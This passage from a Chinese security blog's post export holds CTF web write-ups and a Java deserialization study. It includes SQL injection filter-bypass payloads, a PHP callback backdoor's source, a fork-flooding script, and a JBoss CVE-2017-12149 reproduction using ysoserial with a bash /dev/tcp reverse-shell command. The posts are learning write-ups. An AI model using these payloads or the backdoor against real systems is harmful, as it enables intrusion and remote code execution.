HTTP/1.1\nHost:web.suctf.asuri.org:81\nConnection: Keep-Alive\n\n&apos;)</span><br><span class="line">        # s.close()</span><br><span class="line">        print &apos;ok&apos;</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">i = 8</span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run,range(i) ).get(0xffff)</span><br></pre></td></tr></table></figure><p>我在本地也复现了一下</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/30.jpg"><img src="/2018/11/14/CG-CTF-web篇零基础指南/31.jpg"><p>步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exp:</span><br><span class="line"># get a cookie</span><br><span class="line">$ curl &apos;http://host/&apos; --cookie-jar cookie</span><br><span class="line"></span><br><span class="line"># force apache to fork new process</span><br><span class="line">$ python fork.py</span><br><span class="line"></span><br><span class="line"># get flag</span><br><span class="line">$ curl -b cookie &quot;http://host:port/?func_name=%00lambda_1&quot;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>终于，经过三天做题两天整理，自己好像摸到了些ctf的门槛，虽然还很菜，关于ctf的下一步可能先去学学隐写术再来刷题。</p><p>这些天来学到了很多以前没想过的姿势，也回顾了许多忘了差不多的常见漏洞绕过姿势，都做完之后真的成就感爆棚。</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/end.jpg"><p>希望能给看这篇文章的你带去一些帮助，要是师傅们发现疏漏了还请快指正我！</p><p>教室有些嘈杂，那些嘈杂此时入耳，仿佛成了我心中的白月光。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.jianshu.com/p/19999fa5ca8b" target="_blank" rel="noopener">南邮CTF-WEB-writeup</a></p><p><a href="http://www.ckj123.com/?p=25" target="_blank" rel="noopener">SUCTF web题目 writeup</a></p><p><a href="https://lorexxar.cn/2017/11/10/hitcon2017-writeup/" target="_blank" rel="noopener">HITCON2017-writeup整理</a></p><p><a href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017" target="_blank" rel="noopener">hitcon-ctf-2017 orange官方writeup</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CG-CTF 综合题(2) writeup</title>
      <link href="/2018/11/13/CG-CTF-%E7%BB%BC%E5%90%88%E9%A2%98-2-writeup/"/>
      <url>/2018/11/13/CG-CTF-%E7%BB%BC%E5%90%88%E9%A2%98-2-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这两天在做南邮 ctf 平台的题，学到了不少新知识，拓展了一些思路。</p><p>刚做到了综合题2，做了蛮久，虽然不是很难，但感觉是挺有意思的一道题，于是准备写下我的第一篇writeup。</p><p>这道题涉及到 sql injection，文件包含，请求头以及回调后门，偏向于简单的渗透。</p><p>- 南邮CTF训练平台：<a href="https://cgctf.nuptsast.com/" target="_blank" rel="noopener">https://cgctf.nuptsast.com/</a> </p><p>- 题目地址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">http://cms.nuptzj.cn/</a></p><a id="more"></a><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>进入这道题发现是一个客户留言板，在想会不会是XSS，往下看有个链接 “本CMS说明”，点进去看看。</p><img src="/2018/11/13/CG-CTF-综合题-2-writeup/1.jpg"><p>看一下url:cms.nuptzj.cn/about.php?file=index.php</p><p>可能存在文件包含，用来读取提示的那些文件的代码。</p><p>网上看到一个下载提示文件的python代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import codecs</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">url=&quot;http://cms.nuptzj.cn/about.php?file=&quot;</span><br><span class="line">file_list = [&quot;index.php&quot;,&quot;passencode.php&quot;,&quot;say.php&quot;,&quot;config.php&quot;,&quot;antixss.php&quot;,&quot;about.php&quot;,&quot;so.php&quot;,&quot;antiinject.php&quot;,&quot;xlcteam.php&quot;]</span><br><span class="line">for i in file_list:</span><br><span class="line">    res = requests.get(url+i)</span><br><span class="line">    print(&quot;dowload &quot;+i)</span><br><span class="line">    if res.status_code==200:</span><br><span class="line">        res.encoding=&quot;utf8&quot;</span><br><span class="line">    with codecs.open(i,&quot;w+&quot;,&quot;utf8&quot;) as handle:</span><br><span class="line">        print(&quot;done&quot;)</span><br><span class="line">        text = BeautifulSoup(res.text,&quot;lxml&quot;).text</span><br><span class="line">        handle.write(text)</span><br><span class="line">---------------------</span><br><span class="line">作者：mylyylmy</span><br><span class="line">来源：CSDN</span><br><span class="line">原文：https://blog.csdn.net/mylyylmy/article/details/79885143</span><br></pre></td></tr></table></figure><p>其实也可以直接在网页看代码。</p><p>还提示了数据库表结构，所以推测是用sql注入获取账号密码，那我们还要找到后台页面才行。</p><p>先通过读源码获取信息</p><p>从passencode.php看出将用户的密码存储为了ASCii码格式</p><p>其他的提示php文件代码中也没发现什么，这时突然想起没有读这个about.php本身的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;file&apos;];</span><br><span class="line">    if ($file == &quot;&quot; || strstr($file, &apos;config.php&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;file参数不能为空！&quot;;exit();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">       $cut = strchr($file, &quot;loginxlcteam&quot;);</span><br><span class="line">        if ($cut == false) &#123;</span><br><span class="line">          $data = file_get_contents($file);</span><br><span class="line">          $date = htmlspecialchars($data);</span><br><span class="line">          echo $date;&#125; else &#123;echo &quot;&lt;script&gt;alert(&apos;敏感目录，禁止查看！但是。。。&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从中发现了敏感目录 loginxlcteam，看名字应该就是后台登陆页面了，直接打开</p><img src="/2018/11/13/CG-CTF-综合题-2-writeup/2.jpg"><p>接下来要找sql注入的位置了，回到首页发现有个留言搜索(输入ID)的位置，应该会传参数，输入个1，点搜索到了这个页面</p><img src="/2018/11/13/CG-CTF-综合题-2-writeup/3.jpg"><p>根据提示信息，应该是User-Agent头信息不满足</p><p>用前文的文件包含看一下so.php的源码</p><img src="/2018/11/13/CG-CTF-综合题-2-writeup/4.jpg"><p>发现了User-Agent头应该设置为 Xlcteam Browser，</p><p>发现了构造的sql语句为<code>SELECT * FROM &#39;message&#39; WHERE display=1 AND id=$id</code></p><p>且这个id使用post传递soid参数赋值的</p><p>还发现了包含文件 ‘antiinject.php’ 看文件名应该是防sql注入的</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>通过上一步，我们搜集到了sql注入需要的一些信息，这里我们先看一下sql语句的过滤文件antiinject.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function antiinject($content) &#123;</span><br><span class="line">    </span><br><span class="line">    $keyword = array(&quot;select&quot;, &quot;union&quot;, &quot;and&quot;, &quot;from&quot;, &apos; &apos;, &quot;&apos;&quot;, &quot;;&quot;, &apos;&quot;&apos;, &quot;char&quot;, &quot;or&quot;, &quot;count&quot;, &quot;master&quot;, &quot;name&quot;, &quot;pass&quot;, &quot;admin&quot;, &quot;+&quot;, &quot;-&quot;, &quot;order&quot;, &quot;=&quot;);</span><br><span class="line">    </span><br><span class="line">    $info = strtolower($content);</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt;= count($keyword); $i++) &#123;</span><br><span class="line">        $info = str_replace($keyword[$i], &apos;&apos;, $info);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return $info;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发现过滤了一些敏感词汇，可以使用双重绕过：SELselectECT =&gt; SELECT</p><p>空格也被过滤了，可以使用/**/代表空格</p><p>在构造payload时可以使用也被过滤的 “=” 来截断需要使用的敏感词汇</p><p>先用order by语句获知列数为4，构造语句查看回显情况</p><p><code>soid=0/**/UNunionION/**/SELselectECT/**/1,2,3,4</code></p><img src="/2018/11/13/CG-CTF-综合题-2-writeup/5.jpg"><p>构造payload <code>soid=0/**/UNunionION/**/SELselectECT/**/1,usernam=e,userpas=s,4/**/fro=m/**/admi=n</code></p><img src="/2018/11/13/CG-CTF-综合题-2-writeup/6.jpg"><p>得到后台账户admin及它的ASCII码password <code>102 117 99 107 114 117 110 116 117</code></p><p>解码得到后台登录密码</p><p><code>fuckruntu</code></p><h1 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h1><p>用拿到的账户密码登录后台发现还没有拿到flag，而是得到了新的信息，网站根目录下已经被上传了小马xlcteam.php</p><img src="/2018/11/13/CG-CTF-综合题-2-writeup/7.jpg"><p>继续用开头的文件包含看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&apos;www&apos;];</span><br><span class="line">$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);</span><br><span class="line">array_walk($arr, $e, &apos;&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这是个三参数数组回调后门</p><p>回调后门利用了php中包含回调函数参数的函数 </p><p>具体用法可以参考 phith0n师傅在乌云知识库中的文章 <a href="http://www.anquan.us/static/drops/tips-7279.html" target="_blank" rel="noopener">创造tips的秘籍——PHP回调后门</a></p><p>在 p师傅 的文章中发现了类似的使用：</p><img src="/2018/11/13/CG-CTF-综合题-2-writeup/8.jpg"><p>这里可以尝试做相同的传参操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?www=preg_replace</span><br><span class="line">wtf=phpinfo();</span><br></pre></td></tr></table></figure><p>最后使用scandir() 函数列出当前目录下的文件名并打印</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?www=preg_replace</span><br><span class="line">wtf=print_r(scandir(&apos;.&apos;))</span><br></pre></td></tr></table></figure><img src="/2018/11/13/CG-CTF-综合题-2-writeup/9.jpg"><p>得到flag文件名 “恭喜你获得flag2.txt”</p><p>用文件包含读取这个文件得到flag！ </p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>之前做前面的题时没啥思路总爱看别人的writeup，自己做题时一头雾水，现在好像了解了一些简单的套路。</p><p>这道题其实每一步都不是很难，只不过把多个思路结合到一起了，所以对我这种萌新而言蛮耗时间了。</p><p>像sql注入那里双写就绕过了，也没有过滤逗号，看到一些师傅在博客上写了脚本，大家可以去参考一下。</p><p>做前面的题时还学到了许多其他的知识，这两天做完剩下的几道题就总结一下。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="http://www.anquan.us/static/drops/tips-7279.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-7279.html</a></li><li><a href="http://www.zhzzhz.com/recorder/%E5%8D%97%E9%82%AEctf-%E7%BB%BC%E5%90%88%E9%A2%982-writeup.html" target="_blank" rel="noopener">http://www.zhzzhz.com/recorder/%E5%8D%97%E9%82%AEctf-%E7%BB%BC%E5%90%88%E9%A2%982-writeup.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>理解Java反序列化漏洞(1)</title>
      <link href="/2018/11/07/%E7%90%86%E8%A7%A3Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"/>
      <url>/2018/11/07/%E7%90%86%E8%A7%A3Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这篇博客是对最近以来学习java反序列化漏洞的总结，再由CVE-2017-12149 JBoss 反序列化漏洞和 Webgoat 的分析复现，用到了Burp的插件 Java-Deserialization-Scanner 进而学习了 ysoserial 一个拥有多种不同利用库的Java反序列化漏洞payload生成工具的使用及部分源码分析。</p><a id="more"></a><h1 id="1x00-Java反序列化漏洞"><a href="#1x00-Java反序列化漏洞" class="headerlink" title="1x00 Java反序列化漏洞"></a>1x00 Java反序列化漏洞</h1><h2 id="1x10-Java序列化与反序列化"><a href="#1x10-Java序列化与反序列化" class="headerlink" title="1x10 Java序列化与反序列化"></a>1x10 Java序列化与反序列化</h2><p>Java的序列化（Serialize）与反序列化（Deserialize）是对IO流的一种机制。Java序列化的目标是将对象保存到磁盘中或允许在网络中直接传输对象。序列化机制将允许实现序列化的java对象转换成不依赖平台的字节序列，这些字节序列可以保存在磁盘上，或通过网络传输。而Java的反序列化可以把字节序列恢复为Java对象，也就是说序列化将一个Java对象写入IO流中，反序列化从IO流中恢复这个对象，目的是使对象可以脱离Java运行环境，实现多平台之间的通信与持久化存储。</p><p>那什么样的对象是允许实现序列化的呢？可序列化类必须实现 Serializable 和 Externalizable 两个接口之一，很多类已经实现了 Serializable ，这个接口是一个标记接口，它只是表示实现它的类是可序列化的。</p><p>所有在网上传输的对象的类都应该是可序列化的，主要应用在以下场景：</p><ul><li>HTTP</li><li>RMI（Remote Method Invoke 远程方法调用，Java EE 的基础）：是一组维护开发分布式应用程序的API，实现了不同操作系统程序之间的方法调用，其所有传递的参数，返回值都必须实现序列化。</li><li>JMX ：JMX是一套标准代理与服务，用户可以在任何Java应用程序中使用它，Weblogic 的管理页面和整个 JBoss 都是基于 JMX 框架。</li></ul><p>常用Java序列化与反序列化的方法 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#序列化</span><br><span class="line">FileOutputStream fos = new FileOutputStream(&quot;file.txt&quot;); //创建一个ObjectOutpuStream() 输出流</span><br><span class="line">ObjectOutputStream oos = new ObjectOutputStream(fos);</span><br><span class="line">Person test = new SerializableTest(); </span><br><span class="line">oos.writeObject(test);    //将一个SerializableTest对象输出到输出流中</span><br><span class="line">#反序列化</span><br><span class="line">FileInputStream fis = new FileInputStream(&quot;file.txt&quot;);  //创建一个ObjectInpuStream() 输入流</span><br><span class="line">ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line">Student st1 = (SerializableTest) ois.readObject();</span><br></pre></td></tr></table></figure><p>tips：</p><ul><li>ObjectOutputStream() 输出流是一个处理流，必须建立在其他节点流的基础之上，这个代码中 ObjectOutputStream() 的输出流建立在一个文件输出流的基础之上</li><li>writeObject() 方法将一个对象写入输出流，这时生成了一个”file.txt”的文件，该文件的内容就是 SerializableTest 对象的序列化数据，这里需要注意一点</li><li>调用readObject() 方法读取流中的对象，返回一个 Object 类型的 Java 对象，如果程序知道该 Java 对象的类型，可以强制转换</li><li>反序列化机制无须通过构造器来初始化 Java 对象</li></ul><h2 id="1x20-漏洞成因与影响"><a href="#1x20-漏洞成因与影响" class="headerlink" title="1x20 漏洞成因与影响"></a>1x20 漏洞成因与影响</h2><p>暴露或间接暴露反序列化 API ，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码 </p><blockquote><p>最为出名的大概应该是：15年的Apache Commons Collections 反序列化远程命令执行漏洞，其当初影响范围包括：WebSphere、JBoss、Jenkins、WebLogic 和 OpenNMSd等。</p><p>2016年Spring RMI反序列化漏洞今年比较出名的：Jackson，FastJson</p></blockquote><h2 id="1x30-漏洞原理"><a href="#1x30-漏洞原理" class="headerlink" title="1x30 漏洞原理"></a>1x30 漏洞原理</h2><p>先介绍一个相关知识</p><ul><li><p>序列化文件头是 <code>ac ed 00 05</code>   ac ed 声明使用了序列化协议 00 05是序列化协议版本  </p><p>具体的序列化后二进制字节数据含义可以参考 <a href="https://www.cnblogs.com/senlinyang/p/8204752.html" target="_blank" rel="noopener">Java序列化机制原理</a></p><p><code>ac ed 00 05</code> 经过 base64 编码后为 <code>ro0AB</code></p></li></ul><p>来看一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String args[]) throws Exception&#123;</span><br><span class="line">        //定义myObj对象</span><br><span class="line">        MyObject myObj = new MyObject();</span><br><span class="line">        myObj.name = &quot;hi&quot;;</span><br><span class="line">        //创建一个包含对象进行反序列化信息的”object”数据文件</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(&quot;object&quot;);</span><br><span class="line">        ObjectOutputStream os = new ObjectOutputStream(fos);</span><br><span class="line">        //writeObject()方法将myObj对象写入object文件</span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        //从文件中反序列化obj对象</span><br><span class="line">        FileInputStream fis = new FileInputStream(&quot;object&quot;);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line">        //恢复对象</span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyObject implements Serializable&#123;</span><br><span class="line">    public String name;</span><br><span class="line">    //重写readObject()方法</span><br><span class="line">    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        //执行默认的readObject()方法</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        //执行打开计算器程序命令</span><br><span class="line">        Runtime.getRuntime().exec(&quot;notepad&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次我们自己写了一个 class 来进行对象的序列与反序列化。</p><p>我们看到，MyObject 类有一个公有属性 name ，myObj 实例化后将 myObj.name 赋值为了 “hi” ，然后序列化写入文件 object 。</p><img src="/2018/11/07/理解Java反序列化漏洞-1/8.jpg"><p>查看object文件是以<code>ac ed 00 05</code>开头，序列化成功</p><p>反序列化时调用重写的readObject()方法，导致了命令执行，打开了记事本</p><img src="/2018/11/07/理解Java反序列化漏洞-1/9.jpg"><p>MyObject 类实现了<code>Serializable</code>接口，并且重写了<code>readObject()</code>函数 ，readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p><h1 id="2x00-CVE-2017-12149"><a href="#2x00-CVE-2017-12149" class="headerlink" title="2x00 CVE-2017-12149"></a>2x00 CVE-2017-12149</h1><h2 id="2x10-漏洞成因"><a href="#2x10-漏洞成因" class="headerlink" title="2x10 漏洞成因"></a>2x10 漏洞成因</h2><p>这个漏洞出现在 JBoss 的 HttpInvoker 组件中的ReadOnlyAccessFilter 过滤器 doFilter() 方法中，此方法没有进行任何安全检查和过滤就尝试对接受的数据进行反序列化，造成了反序列化漏洞。</p><p>源码在jboss\server\all\deploy\httpha-invoker.sar\invoker.war\WEB-INF\classes\org\jboss\invocation\http\servlet目录下的ReadOnlyAccessFilter.class文件中,其中doFilter函数代码如下: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</span><br><span class="line">    throws IOException, ServletException</span><br><span class="line">  &#123;</span><br><span class="line">    HttpServletRequest httpRequest = (HttpServletRequest)request;</span><br><span class="line">    Principal user = httpRequest.getUserPrincipal();</span><br><span class="line">    if ((user == null) &amp;&amp; (this.readOnlyContext != null))</span><br><span class="line">    &#123;</span><br><span class="line">      ServletInputStream sis = request.getInputStream();</span><br><span class="line">      ObjectInputStream ois = new ObjectInputStream(sis);</span><br><span class="line">      MarshalledInvocation mi = null;</span><br><span class="line">      try</span><br><span class="line">      &#123;</span><br><span class="line">        mi = (MarshalledInvocation)ois.readObject();</span><br><span class="line">      &#125;</span><br><span class="line">      catch (ClassNotFoundException e)</span><br><span class="line">      &#123;</span><br><span class="line">        throw new ServletException(&quot;Failed to read MarshalledInvocation&quot;, e);</span><br><span class="line">      &#125;</span><br><span class="line">      request.setAttribute(&quot;MarshalledInvocation&quot;, mi);</span><br><span class="line"></span><br><span class="line">      mi.setMethodMap(this.namingMethodMap);</span><br><span class="line">      Method m = mi.getMethod();</span><br><span class="line">      if (m != null) &#123;</span><br><span class="line">        validateAccess(m, mi);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到doFilter()方法直接从http请求中获取数据，在没有进行检查或过滤的情况下，尝试调用readobject()方法对数据流进行反序列化操作，因此产生了反序列化漏洞。</p><p>影响版本</p><ul><li>Jboss AS 5.x</li><li>Jboss AS 6.x </li></ul><h2 id="2x20-分析"><a href="#2x20-分析" class="headerlink" title="2x20 分析"></a>2x20 分析</h2><p>先使用ysoserial生成序列化payload保存到文件中，然后利用curl命令将内容以POST方式发送到服务器端</p><p>ysoserial的用法如下</p><p><code>java -jar ysoserial.jar [payload] &#39;[command]&#39; &gt; poc.ser</code></p><p>[payload] ：利用库，根据服务器端程版本不同而不同，若如报错，可尝试更换其他利用库</p><p>[command] ：待执行的命令 </p><p>但实际操作时发现 <code>java -jar ysoserial.jar CommonsCollections1 &quot;touch /tmp/test&quot; &gt; poc.ser</code> 生成的poc 通过 <code>curl http://ip:port/invoker/readonly --data-binary @poc.ser</code> 发送给服务端时，命令正常执行了</p><p>可当我想反弹一个shell时，<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/21 0&gt;&amp;1</code>命令执行失败，因此想对ysoserial工具的源码分析一下。</p><img src="/2018/11/07/理解Java反序列化漏洞-1/1.jpg"><p>发现这工具是调用Runtime.getRuntime().exec()方法执行命令，所以先分析一下执行方法的过程，具体生成poc的payload分析之后再学习吧。</p><img src="/2018/11/07/理解Java反序列化漏洞-1/2.jpg"><p>判断命令长度不为空，之后先对命令执行了 StringTokenizer() 方法</p><p>该方法源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * Constructs a string tokenizer for the specified string. The</span><br><span class="line">     * tokenizer uses the default delimiter set, which is</span><br><span class="line">     * &lt;code&gt;&quot;&amp;nbsp;&amp;#92;t&amp;#92;n&amp;#92;r&amp;#92;f&quot;&lt;/code&gt;: the space character,</span><br><span class="line">     * the tab character, the newline character, the carriage-return character,</span><br><span class="line">     * and the form-feed character. Delimiter characters themselves will</span><br><span class="line">     * not be treated as tokens.</span><br><span class="line">     *</span><br><span class="line">     * @param   str   a string to be parsed.</span><br><span class="line">     * @exception NullPointerException if str is &lt;CODE&gt;null&lt;/CODE&gt;</span><br><span class="line">     */</span><br><span class="line">    public StringTokenizer(String str) &#123;</span><br><span class="line">        this(str, &quot; \t\n\r\f&quot;, false);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从StrringTokenizer的部分注释和源码可以看到，StringTokenizer会对/t/n/r/f进行分割，因此我们输入的如下命令 </p><p><code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/21 0&gt;&amp;1</code> 会被分割成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">-i</span><br><span class="line">&gt;&amp;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>导致命令无法执行，因此我们需要先进行一次base64编码。</p><p>tips：在 Webgoat8 中的 Java 反序列化中会直接从用户输入中获取 Base64 的序列化对象，并盲目地反序列化，我们将通过一个序列化对象来利用此漏洞，该对象将出发POP链，以实现 RCE。利用时用到了 Burp 的一个插件 Java-Deserialization-Scanner ，该插件使用时也是基于 ysoserial 工具生成 poc 的。但是在实际利用时需要使用 Hibernate 5 重新编译 ysoserial 的源代码，并对输出 base64 从而生成 payload。ysoserial 源代码的分析我们放到后面在说，由于windows并不自带base64命令，所以需要自己写一个python脚本获取输出之后调用base64实现，可我现在的python水平好像这件事对我来说很麻烦。那怎么办呢！难道要用linux吗？不，通过在线网站 <a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">http://jackson.thuraisamy.me/runtime-exec-payloads.html</a> 可以自动生成编码后的代码。</p><img src="/2018/11/07/理解Java反序列化漏洞-1/3.jpg"><p>tips：Linux下的${IFS}也可进行编码,${IFS}的hex值是0x20 0x09 0x0a，因此不被分割，可以利用在写shell时的命令中。但是，${IFS}编码后的命令中有空格，文件名中有空格会造成命令解析不完整，写入文件会失败。而在反弹shell命令中，就会导致模糊的重定向错误，所以此处仅作为扩展内容补充说明</p><img src="/2018/11/07/理解Java反序列化漏洞-1/4.jpg"><h2 id="2x30-复现"><a href="#2x30-复现" class="headerlink" title="2x30 复现"></a>2x30 复现</h2><p>这里我们使用了 ysoserial 的 CommonsCollections1 利用库</p><img src="/2018/11/07/理解Java反序列化漏洞-1/5.jpg"><p>这里的反弹shell语句是上文在线网站编码后的</p><p>netcat 开监听端口</p><img src="/2018/11/07/理解Java反序列化漏洞-1/6.jpg"><p>使用curl命令发送请求 </p><p><code>curl http://172.16.12.2:8080/invoker/readonly --data-binary @poc.ser</code></p><p>服务器接收到以POST的方式发送的序列化数据，会进行反序列化，执行其中包含的命令，将Shell反弹</p><img src="/2018/11/07/理解Java反序列化漏洞-1/7.jpg"><h1 id="3x00-总结"><a href="#3x00-总结" class="headerlink" title="3x00 总结"></a>3x00 总结</h1><p>对于一个使用了可利用库的Java应用，可以通过审计查找其中的反序列化方法readobject()或者交互式查看流量，寻找是否有序号化数据流(以ac ed 00 05)来查找其输入点，再看有没有进行检查或过滤，最后利用工具ysoserial验证是否存在反序列化漏洞 </p><p>对Java反序列化有了一些理解，却不够深入。接下来的几篇博客可能不是有关java反序列化的漏洞了，但之后还是要陆陆续续学习一些像ysoserial利用的CommonsCollections和其他一些payload构造源码分析、Java的反射机制等等</p>]]></content>
      
      
      
        <tags>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
